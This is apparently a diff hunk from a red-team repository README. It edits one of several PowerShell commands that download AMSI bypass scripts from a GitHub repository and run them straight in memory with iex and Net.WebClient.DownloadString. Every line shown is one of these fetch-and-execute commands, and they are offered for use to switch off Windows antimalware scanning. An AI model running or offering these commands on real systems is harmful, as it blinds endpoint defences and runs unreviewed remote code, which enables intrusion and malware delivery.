@@ -54,7 +54,7 @@ iex ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.co
 ```
 **Then Run Any of this AMSI Bypass script into memory**
 ```bash
-iex ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/AnandJogawade/RedTeam-PowerShell-AMSI-Bypass/refs/heads/main/AMSI-Bypass-Scripts/AMSI-Bypass-1.ps1"))
+iex ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/AnandJogawade/RedTeam-PowerShell-AMSI-Bypass/refs/heads/main/AMSI-Bypass-Scripts/AMSI-Bypass.ps1"))
 ```
 ```bash
 iex ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/AnandJogawade/RedTeam-PowerShell-AMSI-Bypass/refs/heads/main/AMSI-Bypass-Scripts/AMSI-Bypass-2.ps1"))
